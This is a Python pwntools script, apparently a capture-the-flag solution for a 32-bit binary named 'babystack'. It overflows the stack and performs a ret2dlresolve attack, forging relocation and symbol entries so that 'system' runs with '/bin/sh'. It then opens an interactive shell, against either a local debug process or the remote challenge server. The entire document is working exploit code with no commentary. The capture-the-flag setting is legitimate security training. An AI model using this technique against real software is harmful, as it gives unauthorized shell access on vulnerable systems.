#!/usr/bin/python

from pwn import *

def exploit():
	target = 0x804a500
	# readelf --all babystack
	# [10] .rel.plt          REL             080482b0
	relplt = 0x80482b0
	# [ 5] .dynsym           DYNSYM          080481cc
	dynsym = 0x80481cc
	# [ 6] .dynstr           DYNSTR          0804822c
	dynstr = 0x804822c
	offset = target+28-relplt
	symaddr = target+36
	align = 0x10-((symaddr-dynsym) & 0xf)
	symaddr += align
	idx_dynsym = (symaddr-dynsym)/0x10
	r_info = (idx_dynsym << 8) | 7
	reloc = p32(exe.got["read"]) + p32(r_info)
	st_name = symaddr+0x10-dynstr
	sym = p32(st_name) + p32(0)*2 + p32(0x12)

	payload = 'a'*0x10
	payload += p32(target)
	payload += p32(exe.plt["read"])
	payload += p32(0x08048519) # pop3 ret
	payload += p32(0)
	payload += p32(target)
	payload += p32(0x50)
	payload += p32(0x80482f0) # .plt
	payload += p32(offset) # reloc_arg
	payload += p32(0) # padding
	payload += p32(target)
	payload = payload.ljust(0x100,'\x00')
	r.send(payload)

	payload = "/bin/sh\x00"
	payload = payload.ljust(0x1c,'\x00')
	payload += reloc
	payload += '?'*align
	payload += sym
	payload += "system\x00"
	r.send(payload)
	r.interactive()

exe = ELF("./babystack")

if len(sys.argv) < 2:
	r = gdb.debug([exe.path],gdbscript="""
		b *0x80482f0
		c
	""")
else:
	r = remote("babystack.problem.cscctf.com",11111)

exploit()